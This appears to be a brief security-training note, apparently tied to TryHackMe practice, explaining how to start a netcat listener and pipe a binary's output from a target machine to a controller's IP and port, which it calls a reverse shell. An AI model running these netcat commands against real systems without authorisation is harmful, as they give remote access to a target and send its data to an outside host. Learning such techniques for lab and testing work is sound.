
Setup a reverse shell for network testing:

First, set up a listener on the controlling machine:

```bash
nc -nlvp <port>
```

Then, on the target machine, create or choose a binary that you want the controlling machine to have access to:

```bash
<binary> | nc <controllers ip address> <controllers port>
```

From the destination machine, execute the commands related to the specified binary. The output will be seen on the 
controlling machine.

<script src="https://tryhackme.com/badge/181597"></script>
